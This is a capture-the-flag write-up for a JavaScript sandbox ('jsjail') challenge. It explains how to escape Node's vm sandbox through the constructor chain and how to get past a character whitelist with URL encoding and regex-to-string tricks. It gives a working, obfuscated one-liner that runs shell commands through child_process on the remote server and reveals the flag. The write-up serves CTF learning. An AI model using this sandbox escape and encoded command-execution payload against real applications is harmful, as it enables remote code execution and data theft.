#### Challenge:

It's clam's newest javascript Calculator-as-a-Service: the CaaSio Please Stop Edition! no but actually please stop I hate jsjails js isn't a good language stop putting one in every ctf I don't want to look at another jsjail because if I do I might vomit from how much I hate js and js quirks aren't even cool or funny or quirky they're just painful because why would you design a language like this ahhhhhhhhhhhhhhhhhhhhh

Connect to it at `nc challs.actf.co 31337`. [Source](./index.js ":ignore")

---

#### Solution:

- there is known way to escape `vm` sandbox via by `this.constructor.constructor("alert(1)")`, only remaining obstacle is the input character whitelist
- most of the banned characters can be `URL` encoded leaving us just to figure out how to construct `string` without any quotes, for that we can use `regex`, `/alert(1)/` have an implicit conversion to string `"/alert(1)/"` and with help of `eval` we can treat unneeded `/` as comments like so `/**/alert(1)/**/`

```bash
echo 'eval(unescape(/%2a%2a%2fthis%2econstructor%2econstructor%28%27return%20process%2emainModule%2erequire%28%22child%5fprocess%22%29%2eexecSync%28%22cat%20flag%2etxt%22%29%2etoString%28%29%27%29%28%29%2f%2a%2a/))' | nc challs.actf.co 31337
```

---

<details><summary>FLAG:</summary>

```
actf{omg_js_is_like_so_quirky_haha}
```

</details>
<br/>
